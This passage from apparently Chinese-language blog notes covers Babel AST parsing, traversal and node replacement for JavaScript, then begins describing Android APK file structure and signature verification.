Explorer网站中对其进行Babel解析为AST，解析后AST有很多层级，这些层级互为父子节点对于解析后的结构查看相应的书籍内容即可，这里只是记录一些基础名称</p><ul><li>VariableDeclaration：表示是变量声明语句</li><li>kind：表示变量声明语句使用的关键字</li><li>declarations：声明的具体变量，是一个数组。</li><li>每一个变量都以VariableDeclarator表示</li><li>VariableDeclarator的属性主要是id和init，对于init，如果只是声明没有初始值，init为null，否则init节点下还有内容</li><li>对于上述原始代码而言，把对象字面量赋值给obj，成为ObjectExpression(对象表达式)，有对象自然有属性，所以properties是数组，一个属性对应一个成员，查看properties下内容</li><li>ObjectProperty：表示对象属性，</li><li>因为对象是键值对组成，在表示对象属性时，会有key和value两个节点，key是Identifier(标识符)，名字是name，对象的key也可以用字符串表示，这是key节点类型变为StringLiteral(字符串字面量)，value类型为StringLiteral</li><li>extra节点可以删除</li><li>对于函数表达式赋值给对象属性：type为FunctionExpression，函数名对象id节点，由于代码把一个匿名函数赋值给obj的add属性，所以这里id为null，函数参数对应params节点，是个数组，**如果没参数params节点为空数组，**函数体对应body节点</li><li>一般函数体都会用BlockStatement节点包裹，，BlockStatement里的body节点是多条语句，所以body是数组，如果函数有&quot;use strict&quot;标记，那么directives里会有相应节点</li><li>ReturnStatement(返回语句)</li><li>argument：函数返回内容，没有返回则为null</li><li>BinaryExpression：二元式</li><li>NumericLiteral：数值字面量</li></ul><h3 id="代码基本结构">代码基本结构</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);   <span class="comment">//读写文件</span></span><br><span class="line"><span class="keyword">const</span> parser = <span class="built_in">require</span>(<span class="string">&quot;@babel/parser&quot;</span>);  <span class="comment">//@babel/parser：用来将js代码转化为AST</span></span><br><span class="line"><span class="keyword">const</span> traverse = <span class="built_in">require</span>(<span class="string">&quot;@babel/traverse&quot;</span>).<span class="property">default</span>;<span class="comment">//@babel/traverse:遍历ast中的节点</span></span><br><span class="line"><span class="keyword">const</span> t = <span class="built_in">require</span>(<span class="string">&quot;@babel/types&quot;</span>);            <span class="comment">//@babel/types：判断节点类型，生成新的节点等</span></span><br><span class="line"><span class="keyword">const</span> generator = <span class="built_in">require</span>(<span class="string">&quot;@babel/generator&quot;</span>).<span class="property">default</span>;  <span class="comment">//ast转化为js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> jscode = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;./demo.js&quot;</span>, &#123;</span><br><span class="line"><span class="attr">encoding</span>: <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">  &#125;);</span><br><span class="line"><span class="keyword">let</span> ast = parser.<span class="title function_">parse</span>(jscode);</span><br><span class="line"></span><br><span class="line"><span class="comment">//在这里对AST进行一系列的操作</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> code = <span class="title function_">generator</span>(ast).<span class="property">code</span>;</span><br><span class="line">fs.<span class="title function_">writeFile</span>(<span class="string">&#x27;./demoNew.js&#x27;</span>, code, <span class="function">(<span class="params">err</span>)=&gt;</span>&#123;&#125;);</span><br></pre></td></tr></table></figure><p><strong>AST处理JS基本步骤</strong></p><ul><li>读取js文件解析为AST</li><li>对节点增删改查</li><li>生成js代码</li></ul><p><strong>后续内容没有特殊说明都以这个结构为准，代码只展现中间对ast有操作的部分</strong></p><h2 id="Babel中的组件">Babel中的组件</h2><p>Babel的编译过程主要以下三个阶段</p><ul><li>解析：将输入字符流解析AST抽象语法树</li><li>转化：对抽象语法树进一步转化</li><li>生成：根据转化后的语法树生成目标代码</li></ul><h3 id="Babel的解析">Babel的解析</h3><p>包括两个内容：词法分析与语法分析，经过这一步以后，可以直接得到输入源代码的AST抽象语法树</p><h3 id="Babel的转化">Babel的转化</h3><p>转化步骤接收ast并对其进行遍历，再次过程中对节点进行添加，更新及移除等操作。后续对混淆js代码以及混淆js代码的还原都在此处，<strong>这是本书的重点</strong>，之所以将字符流转化为抽象语法树，原因是树状结构更加容易进行原子操作，可以对任意节点进行精细化的处理。在抽象语法树中，代码见得关系被抽象为节点的关系，而实现相同功能的节点之间的表示也是相同的，利用这一点，可以再语法树层面对输入的代码进行增删改查，而不必关心代码的书写。制定几条规则，Babel就可以对抽象语法树进行遍历，完成整个代码批量操作</p><h3 id="Babel的生成">Babel的生成</h3><p>代码生成步骤把最终的ast语法树转换成字符串式的代码，代码生成很简单：深度优先遍历整个AST，然后构建可以表示转化后代码的字符串，经过这一步，就可以得到从ast抽象语法层层面修改过的代码。</p><h3 id="parser与generator">parser与generator</h3><p>parser：将JS代码转化为AST  ==&gt; <code>let ast=parser.parse(jscode)</code>输出前使用JSON.stringify把对象转为json数据，如<code>JSON.stringify(ast,null,2)</code></p><p>generator：将AST转化为JS ==》 <code>let code=generator(ast).code</code>返回 一个对象，其中code属性才是需要的代码。</p><p>parser的parse是有两个参数，但是第二个参数在es6中才需要写出来，例如当看到js代码中有import，export时，就需要写出第二个参数且sourceType要指定为module。(sourceType默认为script)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ast = parser.<span class="title function_">parse</span>(jscode,&#123;</span><br><span class="line">    <span class="attr">sourceType</span>:<span class="string">&quot;module&quot;</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>generator返回的一个对象，同时他的第二个参数接纳一个对象，可以设置一些来影响输出结果。如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> code = <span class="title function_">generator</span>(ast, &#123;</span><br><span class="line"><span class="attr">retainLines</span>: <span class="literal">false</span>, </span><br><span class="line"><span class="attr">comments</span>: <span class="literal">false</span>, </span><br><span class="line"><span class="attr">compact</span>: <span class="literal">true</span></span><br><span class="line">&#125;).<span class="property">code</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(code);</span><br></pre></td></tr></table></figure><p>retainLines表示是否使用与源代码相同的行号，默认false，输出的是格式化之后的代码。</p><p>comments表示是否保留注释，默认true。</p><p>compact表示是否压缩代码，其中minified压缩程度最多，concise最少</p><h3 id="traverse与visitor">traverse与visitor</h3><p>traverse用来遍历AST，但是单纯遍历没有意义，所以配合visitor使用。</p><p><code>visitor</code>是一个对象，她可以用来定义一些方法，用来过滤节点。</p><p><strong>案例理解traverse与visitor</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> visitor=&#123;&#125;;</span><br><span class="line">visitor.<span class="property">FunctionExpression</span>=<span class="title function_">funtion</span>(<span class="params">path</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;xxx&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">traverse</span>(ast,visitor);</span><br></pre></td></tr></table></figure><p><strong>分析</strong>：声明对象，名字随便。再给对象增加一个名为FunctionExpression的方法，它的名字是需要遍历的节点的类型(注意大小写)。traverse会遍历ast所有节点，当节点是FunctionExpression类型，调用visitor中的方法。visitor中的方法接收一个参数，traverse在遍历时，会把当前节点的Path对象传给他。最后把visitor作为第二个参数传到traverse里，第一个参数是ast。</p><p><strong>定义visitor的三种方式</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> visitor1=&#123;</span><br><span class="line">    <span class="title class_">FunctionExpression</span>:<span class="keyword">function</span>(<span class="params">path</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;xxx&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//最常用</span></span><br><span class="line"><span class="keyword">const</span> visitor2=&#123;</span><br><span class="line">    <span class="title class_">FunctionExpression</span>(path)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;xxx&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> visitor3=&#123;</span><br><span class="line">    <span class="title class_">FunctionExpression</span>:&#123;</span><br><span class="line">        <span class="title function_">enter</span>(<span class="params">path</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;xxx&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在visitor3中存在一个enter，表示进入节点时，还有一个exit 表示退出节点时，这两个时机可以访问节点</span></span><br></pre></td></tr></table></figure><p>还可以把方法名使用<code>'|'</code>连接，如<code>FunctionExpression|BinaryExpression</code>形式字符串,把一个方法应用对个节点中。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> visitor2=&#123;</span><br><span class="line">    <span class="string">&quot;FunctionExpression | BinaryExpression &quot;</span>(path)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;xxx&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>也可以把多个函数应用一个节点中，如原先是把一个函数赋值给enter或者exit，现在改为函数的数组，会按照顺序依次进行。如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">func1</span>(<span class="params">path</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;func1&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">func2</span>(<span class="params">path</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;func2&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> visitor3=&#123;</span><br><span class="line">    <span class="title class_">FunctionExpression</span>:&#123;</span><br><span class="line">        <span class="attr">enter</span>:[func1,func2]          </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>traverse并非必须从遍历，它可从任意节点向下遍历，例如想要把代码中所有函数的第一个参数改为x</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> updateParamNameVisitor=&#123;</span><br><span class="line">    <span class="title class_">Identifier</span>(path)&#123;</span><br><span class="line">        <span class="keyword">if</span>(path.<span class="property">node</span>.<span class="property">name</span> === <span class="variable language_">this</span>.<span class="property">paramName</span>)&#123;</span><br><span class="line">            path.<span class="property">node</span>.<span class="property">name</span>=<span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> visitor=&#123;</span><br><span class="line">    <span class="title class_">FunctionExpression</span>(path)&#123;</span><br><span class="line">        <span class="keyword">const</span> paramName=path.<span class="property">node</span>.<span class="property">params</span>[<span class="number">0</span>].<span class="property">name</span>;<span class="comment">//取出函数第一个参数名</span></span><br><span class="line">        path.<span class="title function_">traverse</span>(updateParamNameVisitor,&#123;</span><br><span class="line">            paramName</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">traverse</span>(ast,visitor)；</span><br></pre></td></tr></table></figure><p>解析：先用traverse根据visitor去遍历所有节点，当遍历到 FunctionExpression节点，用path.traverse根据updateParamNameVisitor去遍历当前节点下所有子节点，然后修改与函数第一个参数相同的标识符，在使用 path.traverse还可以传入一个对象，在对应的visitor中用this引用它</p><h3 id="type组件">type组件</h3><p>该组件主要用来判断节点的类型，生成新的节点等。</p><p>t.isIdentifier(path.node)，等同于path.node.type === “Identifier”,还可以再判断类型的同时附加条件，如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">traverse</span>(ast,&#123;</span><br><span class="line">    <span class="title function_">enter</span>(<span class="params">path</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(path.<span class="property">node</span>.<span class="property">type</span> === <span class="string">&quot;Identifier&quot;</span> &amp;&amp; path.<span class="property">node</span>.<span class="property">name</span>===<span class="string">&quot;n&quot;</span>)&#123;</span><br><span class="line">path.<span class="property">node</span>.<span class="property">name</span>=<span class="string">&quot;x&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//等同于</span></span><br><span class="line"><span class="title function_">traverse</span>(ast,&#123;</span><br><span class="line">    <span class="title function_">enter</span>(<span class="params">path</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(t.<span class="title function_">isIdentifier</span>(path.<span class="property">node</span>，&#123;<span class="attr">name</span>:<span class="string">&#x27;n&#x27;</span>&#125;))&#123;</span><br><span class="line">path.<span class="property">node</span>.<span class="property">name</span>=<span class="string">&quot;x&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>如果要判断其他类型，只需要改is后面的类型。</p><p>当节点不符合要求，抛出错误</p><p>```t.assertBinaryExpression(node对象)` 是一种断言工具，用于检查传入的节点是否是 二元表达式（BinaryExpression）。``</p><p><code>t.assertBinaryExpression(maybeBinaryExpressionNode,&#123;operator:&quot;*&quot;&#125;); 判断是否是二项式并且操作符是*</code></p><h2 id="Path对象详解">Path对象详解</h2><h3 id="Path与Node区别">Path与Node区别</h3><p><code>path.stop</code>：停止遍历节点 与Babel中的<code>path.skip</code>类似</p><p>path.node能取出某类型的node对象，节点是Path的一部分，Path是一个对象，用来描述两个节点之间的连接</p><h3 id="Path中的方法">Path中的方法</h3><h4 id="获取子节点-path">获取子节点/path</h4><p>为了得到ast节点的属性值，一般先访问到该节点，然后利用path.node.property获取属性(property代指某个属性名)，如path.node.right，path.node.left，path.node.operator，通过这个方法获得的是Node或者具体属性值。</p><p>Node不能使用Path的方法，如果要获得该属性的Path，使用path.get(“属性名 字符串形式”)</p><p>任何形式属性值，通过path.get去获取，都会包装为Path对象再返回，像name,operator这一类就没必要包装</p><h4 id="判断Path类型">判断Path类型</h4><p><img src="assets/image-20241115203344621.png" alt="image-20241115203344621"></p><h4 id="节点转代码">节点转代码</h4><p>generator组件可以把ast代码中的一部分节点转为代码，这对节点遍历过程中的调试有帮助</p><h4 id="替换节点属性">替换节点属性</h4><p>替换节点属性与获取节点属性方法相同，只是改为赋值，但也不是随意替换，需注意，替换的类型要在允许的类型范围内</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> visitor3=&#123;</span><br><span class="line">    <span class="title class_">BinaryExpression</span>:&#123;</span><br><span class="line">        <span class="title function_">enter</span>(<span class="params">path</span>)&#123;</span><br><span class="line">            path.<span class="property">node</span>,left=t.<span class="title function_">identifier</span>(<span class="string">&quot;x&quot;</span>)</span><br><span class="line">            path.<span class="property">node</span>,right=t.<span class="title function_">identifier</span>(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">&#125;     </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="替换整个节点">替换整个节点</h4><p>Path中与替换相关的方法：replaceWith,replaceWithMultiple,replaceInline,replaceWithSourceString</p><p>replaceWith,是用一个节点替换另一个节点，严格一换一</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> visitor=&#123;</span><br><span class="line">    <span class="title class_">BinaryExpression</span>(path)&#123;</span><br><span class="line">        path.<span class="title function_">replaceWith</span>(t.<span class="title function_">valueToNode</span>(<span class="string">&quot;xxxx&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">traverse</span>(ast,visitor);</span><br></pre></td></tr></table></figure><p>replaceWithMultiple也是节点换节点，不过是多换一</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> visitor=&#123;</span><br><span class="line">    <span class="title class_">ReturnStatement</span>(path)&#123;</span><br><span class="line">        path.<span class="title function_">replaceWithMultiple</span>([</span><br><span class="line">            t.<span class="title function_">expressionStatement</span>(t.<span class="title function_">stringLiteral</span>(<span class="string">&quot;xxx&quot;</span>)),</span><br><span class="line">            t.<span class="title function_">expressionStatement</span>(t.<span class="title function_">numericLiteral</span>(<span class="number">1000</span>)),</span><br><span class="line">            t.<span class="title function_">returnStatement</span>(),</span><br><span class="line">        ]);</span><br><span class="line">       path.<span class="title function_">stop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">traverse</span>(ast,visitor);</span><br></pre></td></tr></table></figure><p>代码解析：当表达式语句单独在一行(没有赋值)，最好用expressionStatement包裹，替换后的节点，traverse也能遍历到。</p><p>replaceInline接收一个参数，如果参数不是数组，那么replaceInline等同于replaceWith；如果是数组，则等同于replaceWithMultiple，其中的数组成员必须是节点</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> visitor=&#123;</span><br><span class="line">    <span class="title class_">StringLiteral</span>(path)&#123;</span><br><span class="line">        path.<span class="title function_">replaceInline</span>(</span><br><span class="line">        t.<span class="title function_">stringLiteral</span>(<span class="string">&quot;1111&quot;</span>));</span><br><span class="line">        path.<span class="title function_">stop</span>();</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title class_">ReturnStatement</span>(path)&#123;</span><br><span class="line">        path.<span class="title function_">replaceInline</span>([</span><br><span class="line">            t.<span class="title function_">expressionStatement</span>(t.<span class="title function_">stringLiteral</span>(<span class="string">&quot;xxx&quot;</span>)),</span><br><span class="line">            t.<span class="title function_">expressionStatement</span>(t.<span class="title function_">numericLiteral</span>(<span class="number">1000</span>)),</span><br><span class="line">            t.<span class="title function_">returnStatement</span>(),</span><br><span class="line">        ]);</span><br><span class="line">       path.<span class="title function_">stop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">traverse</span>(ast,visitor);</span><br></pre></td></tr></table></figure><p>replaceWithSourceString()：用字符串源码替换节点，如把原始代码中的函数改为闭包形式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">traverse</span>(ast,&#123;</span><br><span class="line">    <span class="title class_">RertuenStatement</span>(path)&#123;</span><br><span class="line">        <span class="keyword">let</span> argumentPath=path.<span class="title function_">get</span>(<span class="string">&#x27;argument&#x27;</span>);</span><br><span class="line">        argumentPath.<span class="title function_">replaceWithSourceString</span>(</span><br><span class="line">            <span class="string">&#x27;function()&#123;return&#x27;</span>+argumentPath+<span class="string">&#x27;&#125;()&#x27;</span></span><br><span class="line">        );</span><br><span class="line">        path.<span class="title function_">stop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="删除节点">删除节点</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">traverse</span>(ast,&#123;</span><br><span class="line">    <span class="title class_">EmptyStatement</span>(path)&#123;</span><br><span class="line">        path.<span class="title function_">remove</span>(); <span class="comment">//删除当前节点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>EmptyStatement指的是空语句，就是多余的分号。</p><h4 id="插入节点">插入节点</h4><p>想要把节点插入到兄弟节点中，可以使用insertBefore和insertAfter分别在当前节点前后插入结点</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">traverse</span>(ast,&#123;</span><br><span class="line">   <span class="title class_">ReturnStatement</span>(path)&#123;</span><br><span class="line">        path.<span class="title function_">insertBefore</span>(t.<span class="title function_">expressionStatement</span>(t.<span class="title function_">stringLiteral</span>(<span class="string">&quot;before&quot;</span>))); </span><br><span class="line">       path.<span class="title function_">insertAfter</span>(t.<span class="title function_">expressionStatement</span>(t.<span class="title function_">stringLiteral</span>(<span class="string">&quot;after&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="父级Path">父级Path</h3><p>Path对象中有parentPath和parent两个属性，其中parentPath类型为NodePath，他是父级Path，parent类型为Node，他是父节点。</p><p>父级Path获取：path.parentPath，path.parentPath.node等同于path.parent。</p><h4 id="path-findParent">path.findParent</h4><p>个别情况下，需要从一个路径向上遍历语法树，直到满足相应的条件，这时可以使用findParent。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">traverse</span>(ast,&#123;</span><br><span class="line">   <span class="title class_">ReturnStatement</span>(path)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(path.<span class="title function_">findParent</span>(<span class="function">(<span class="params">p</span>)=&gt;</span>p.<span class="title function_">isObjectExpression</span>()));</span><br><span class="line">       <span class="comment">//path.findParent(function(p)&#123;return p.isObjectExpression()&#125;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历returnstatement，然后向上找父级Path，当找到path对象类型为ObjectExpression,返回该path对象</span></span><br></pre></td></tr></table></figure><p>Path对象的findParent接收一个回调函数，在向上遍历每一个父级path时，会调用这个函数，并传入对应父级path对象作为参数，当该回调函数返回真值时，则将对应的父级path对象返回，</p><h4 id="path-find">path.find</h4><p>使用与findParent一致，只不过find查找范围包括当前节点，</p><h4 id="path-getFunctionParent">path.getFunctionParent</h4><p>向上查找与当前节点最接近的父函数，返回的也是path对象</p><h4 id="path-getStatementParent">path.getStatementParent</h4><p>向上遍历语法树直到找到语句父节点，例如，声明语句，return语句，if语句，which语句和while语句，返回的也是path对象，该方法从当前节点找，如果想要找到return语句父语句，从parentPath中调用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">traverse</span>(ast,&#123;</span><br><span class="line">   <span class="title class_">ReturnStatement</span>(path)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(path.<span class="property">parentPath</span>.<span class="property">getStatementParent</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="父级path其他方法">父级path其他方法</h4><p>与之前介绍类似，如替换父节点path.parentPath.replaceWith(Node)</p><p>和删除父节点(path.parentPath.remove)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h1>Android基础性知识</h1><h2 id="apk文件结构">apk文件结构</h2><p>apk文件后缀为.apk。就是安卓上的安装包，而apk文件其实就是一个压缩包，可以对其进行解压缩。apk文件里面一般包括以下部分：静态资源文件(assets)，库文件(lib)，签名文件(META-INF)，编译资源文件(res)，配置清单文件(AndroidManifest.xml)，核心代码文件(classes.dex)和资源映射文件(resources.arsc)等。<img src="assets/image-20231016174722001.png" alt="image-20231016174722001"></p><h3 id="image-20231016175007953assets文件夹"><img src="assets/image-20231016175007953.png" alt="image-20231016175007953">assets文件夹</h3><p>assets 这里存放的是静态资源文件(图片，视频等)。这个文件夹下的资源文件不会被编译，而是直接打包进应用程序中。这些文件通常是一些静态资源，如图片、音频、文本文件等。assets中的资源访问速度较快，通常情况下，开发者会将应用程序中的静态文件、配置文件、原始数据或者其他不常改变的文件放在 assets 文件夹中。</p><h3 id="lib文件夹">lib文件夹</h3><p><a href="http://xn--q8s43uvp1bpxe.so">里面存放.so</a>(动态链接库)文件，它包含在应用程序中，可以在运行时被调用。这些库通常包含许多常见的函数和程序，lib文件夹下有不同系统架构的so文件，可适用于不同环境中，rmeabi-v7a目录基本通用所有android设备，arm64-v8a目录只适用于64位的android设备，x86目录常见用于android模拟器，x86-64目录适用于支持x86_64架构的Android设备。</p><p>在安卓系统中库文件分为两种：一种是共享库文件，另一种是本地库文件。</p><p>共享库文件可供多个应用程序使用，提高运行效率。共享库文件以.so为后缀，<a href="http://xn--libc-zx5fppk7lw85aqxan35c3vblx8gjj0c.xn--solibm-j76j.so">常见的共享库文件是libc.so和libm.so</a></p><p>lib文件夹下的是本地库文件，为特定应用程序所使用的。</p><h3 id="META-INF文件夹">META-INF文件夹</h3><p>META-INF文件夹是存放数字签名相关文件的文件夹，包含以下三个文件：</p><ol><li>MANIFEST.MF：是一个摘要清单文件，它包含了apk文件中除自己以外所有文件的数字摘要(名称和哈希值)，用于确保APK文件的完整性。</li><li>CERT.SF：用于存储通过私钥加密后得到的MANIFEST.MF文件的数字签名信息以及MANIFEST.MF文件中数字摘要的数字签名信息。即存放使用私钥加密后的数字摘要信息。</li><li>CERT.PSA：包含解密使用的public key和对文件签名时所使用的数字证书。</li></ol><p>之，META-INF文件夹中的文件是用于保护APK文件的完整性和真实性的重要文件，可以确保APK文件来自合法的开发者，并且没有被篡改过。</p><p>APK在安装APK时，会验证APK的数字签名是否合法，验证过程包括以下几个步骤：</p><ol><li>提取APK文件中的数字证书。</li><li>从数字证书中提取公钥。</li><li>使用该公钥对APK文件中的数字签名进行解密，得到数字摘要。</li><li>对APK文件进行Hash运算，生成数字摘要。</li><li>比较步骤3和步骤4中生成的数字摘要是否一致，如果一致则认为数字签名合法，否则认为数字签名不合法。</li></ol><h3 